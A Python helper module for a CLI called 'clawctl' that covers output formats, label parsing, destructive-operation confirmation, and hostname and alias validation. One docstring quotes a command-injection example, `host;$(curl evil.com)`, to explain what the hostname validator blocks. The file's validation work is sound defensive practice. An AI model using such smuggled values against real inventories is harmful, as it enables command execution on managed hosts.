"""Shared helpers for `clawctl` Pattern-B subtrees (`host`, `agent`).

The contract:

- `OutputFormat` — the `-o` enum every `get` and `describe` exposes
  (matches plan §6.1: `table | json | yaml | wide | name`).
- `parse_kv_labels()` — parse `KEY=VALUE` selectors for `-l` flags.
- `parse_kv_pairs()` — parse `KEY=VALUE` and `KEY-` (delete) pairs for
  `label` verb.
- `require_flag()` — non-interactive contract enforcement: when stdin
  is not a TTY and a required flag is missing, emit a clean Error +
  Hint and exit non-zero (plan §7).
- `confirm_destructive()` — destructive ops prompt on TTY, fail-fast on
  non-TTY unless `--yes` supplied (plan §6.1).
- `now_seconds_since()` — compute seconds elapsed since an ISO-8601
  timestamp for AGE columns.
- `is_local_host()` — loopback / 127.0.0.1 / localhost detection.

All helpers stay free of `clawrium.core.*` imports — they manipulate
CLI primitives only.
"""

from __future__ import annotations

import re
import sys
from datetime import datetime, timezone
from enum import Enum
from typing import IO, Iterable, Optional

import typer

from clawrium.cli.output import emit_error
from clawrium.cli.output._sanitize import sanitize

__all__ = [
    "OutputFormat",
    "confirm_destructive",
    "is_local_host",
    "now_seconds_since",
    "parse_kv_labels",
    "parse_kv_pairs",
    "require_flag",
    "stdin_is_tty",
    "validate_alias",
    "validate_hostname",
]


# RFC 1123 superset: each label up to 63 chars, total up to 253. First
# char must be alphanumeric OR `:` (to admit IPv6 literals like `::1`,
# `2001:db8::1`). The character class explicitly excludes shell
# metacharacters (`;`, `$`, `(`, backtick, whitespace, etc.) that would
# enable Ansible inventory injection (ATX iter-1 B10).
# Max total length 253 = 1 first char + up to 252 trailing.
_HOSTNAME_RE = re.compile(r"^[a-zA-Z0-9:][a-zA-Z0-9._:-]{0,252}$")

# Max DNS label length: RFC 1035 §2.3.4. ATX iter-2 W1 — per-label
# enforcement happens after the regex match so the IPv6 literal case
# (`:` separators) stays exempt.
_DNS_LABEL_MAX = 63

# Aliases are simpler: positive whitelist mirroring `core/names.py:validate_agent_name`.
_ALIAS_RE = re.compile(r"^[a-zA-Z0-9_-]+$")


class OutputFormat(str, Enum):
    """Output format for `get` / `describe` (plan §6.1)."""

    table = "table"
    json = "json"
    yaml = "yaml"
    wide = "wide"
    name = "name"


def stdin_is_tty(stream: Optional[IO[str]] = None) -> bool:
    """Return True if stdin is a TTY (interactive). Mockable via param.

    Used by `require_flag` and `confirm_destructive` to enforce the
    plan §7 non-interactive contract.
    """
    target = stream if stream is not None else sys.stdin
    return bool(getattr(target, "isatty", lambda: False)())


def require_flag(
    value: object,
    *,
    flag: str,
    hint: Optional[str] = None,
) -> None:
    """Enforce a required-flag contract on non-TTY stdin.

    If `value` is missing (None or empty string) AND stdin is not a TTY,
    emit `Error: missing required flag <flag>` and exit non-zero. On
    TTY, the caller is expected to prompt for the value separately (the
    per-verb prompt fallback is owned by the verb, not this helper).
    """
    missing = value is None or (isinstance(value, str) and not value.strip())
    if not missing:
        return
    if stdin_is_tty():
        # The caller may still prompt; do nothing here.
        return
    emit_error(
        f"missing required flag {flag}",
        hint=hint or f"pass {flag} on the command line",
    )


def confirm_destructive(
    *,
    prompt: str,
    yes: bool,
) -> None:
    """Confirm a destructive op. Plan §6.1 / §"Specific Outcomes":

    - `--yes` supplied → proceed silently.
    - TTY stdin and no `--yes` → prompt `[y/N]`. Decline aborts with
      exit 0 ("Cancelled.").
    - Non-TTY stdin and no `--yes` → fail-fast with Error + Hint.

    This sits at the boundary between user-confirmable action and the
    non-interactive contract.
    """
    if yes:
        return
    if not stdin_is_tty():
        emit_error(
            "refusing destructive operation without --yes on non-TTY stdin",
            hint="re-run with --yes",
        )
    confirmed = typer.confirm(prompt, default=False)
    if not confirmed:
        typer.echo("Cancelled.")
        raise typer.Exit(code=0)


def parse_kv_labels(items: Optional[Iterable[str]]) -> dict[str, str]:
    """Parse a list of `KEY=VALUE` selectors (used by `-l` / `--selector`).

    Empty/None input returns an empty dict. Invalid entries (no `=`)
    raise via `emit_error` so the CLI exits cleanly.
    """
    if not items:
        return {}
    out: dict[str, str] = {}
    for raw in items:
        if "=" not in raw:
            emit_error(
                f"invalid selector {raw!r}",
                hint="use KEY=VALUE form",
            )
        key, _, value = raw.partition("=")
        key = key.strip()
        value = value.strip()
        if not key:
            emit_error(
                f"invalid selector {raw!r}",
                hint="key cannot be empty",
            )
        out[key] = value
    return out


def parse_kv_pairs(items: Iterable[str]) -> tuple[dict[str, str], list[str]]:
    """Parse `KEY=VALUE` (set) and `KEY-` (delete) pairs.

    Used by the `label` verb. Returns `(set_map, delete_keys)`.
    Invalid entries (no `=` and no trailing `-`) exit non-zero.
    """
    set_map: dict[str, str] = {}
    delete_keys: list[str] = []
    for raw in items:
        if raw.endswith("-") and "=" not in raw:
            key = raw[:-1].strip()
            if not key:
                emit_error(
                    f"invalid label {raw!r}",
                    hint="use KEY=VALUE to set or KEY- to delete",
                )
            delete_keys.append(key)
            continue
        if "=" not in raw:
            emit_error(
                f"invalid label {raw!r}",
                hint="use KEY=VALUE to set or KEY- to delete",
            )
        key, _, value = raw.partition("=")
        key = key.strip()
        if not key:
            emit_error(
                f"invalid label {raw!r}",
                hint="key cannot be empty",
            )
        set_map[key] = value.strip()
    return set_map, delete_keys


def now_seconds_since(iso_timestamp: Optional[str]) -> int:
    """Return seconds elapsed since `iso_timestamp` (RFC3339 / ISO8601).

    Missing or unparseable timestamps return 0 — surfacing as `0s` in
    the AGE column. Wall-clock skew that produces negative values is
    clamped to 0 (the AGE formatter does the same).
    """
    if not iso_timestamp:
        return 0
    try:
        # Accept both `2026-05-23T10:14:00Z` and offset-aware forms.
        ts = iso_timestamp
        if ts.endswith("Z"):
            ts = ts[:-1] + "+00:00"
        parsed = datetime.fromisoformat(ts)
        if parsed.tzinfo is None:
            parsed = parsed.replace(tzinfo=timezone.utc)
    except (TypeError, ValueError):
        return 0
    now = datetime.now(timezone.utc)
    delta = (now - parsed).total_seconds()
    return max(0, int(delta))


# Loopback only — `0.0.0.0` is the wildcard bind address, not a loopback.
# A host record stored as `0.0.0.0` should NOT skip the SSH tunnel; ATX
# iter-1 S4 / W3 caught this.
_LOCAL_HOSTS = {"localhost", "127.0.0.1", "::1"}


def is_local_host(hostname: Optional[str]) -> bool:
    """Return True for loopback / "localhost" forms.

    Used by `agent open` and `agent port-forward` to skip SSH tunnel
    setup when the agent runs on the same machine as the CLI.
    """
    if not hostname:
        return False
    return hostname.strip().lower() in _LOCAL_HOSTS


def validate_hostname(value: str, *, field: str = "hostname") -> None:
    """Validate a hostname (or IP literal) before writing to hosts.json.

    Enforces an RFC 1123-derived character class plus bidi/control-char
    rejection. Bad values exit non-zero with `Error: invalid <field>`.

    Closes ATX iter-1 B10 / W11: prevents Ansible inventory injection
    via hostnames like `host;$(curl evil.com)` and bidi-override smuggling.
    """
    if not value:
        emit_error(f"empty {field}")
    if sanitize(value) != value:
        emit_error(f"invalid {field} {value!r}", hint="control/bidi chars not allowed")
    if not _HOSTNAME_RE.match(value):
        emit_error(
            f"invalid {field} {value!r}",
            hint="must match RFC 1123: alphanumeric, '.', '-', up to 253 chars",
        )
    # Per-label ≤63 chars (RFC 1035 §2.3.4). ATX iter-2 W1 — a 64-char
    # label like `'a'*64 + '.com'` passes the total-length regex but is
    # invalid DNS; Ansible may reject it later, but we'd rather catch it
    # at the CLI boundary. IPv6 literals (contain `:`) are exempt — they
    # have a different label model.
    if ":" not in value:
        for label in value.split("."):
            if len(label) > _DNS_LABEL_MAX:
                emit_error(
                    f"invalid {field} {value!r}",
                    hint=f"DNS label longer than {_DNS_LABEL_MAX} chars: {label!r}",
                )


def validate_alias(value: str) -> None:
    """Validate an alias (RFC-1123 subset, positive whitelist).

    Mirrors `core/names.py:validate_agent_name` so aliases passing this
    check are also safe as Ansible inventory names. Closes ATX iter-1
    W10 (alias accepted shell metacharacters).
    """
    if not value:
        emit_error("empty alias")
    if sanitize(value) != value:
        emit_error(f"invalid alias {value!r}", hint="control/bidi chars not allowed")
    if not _ALIAS_RE.match(value):
        emit_error(
            f"invalid alias {value!r}",
            hint="must be alphanumeric, '_', or '-' only",
        )
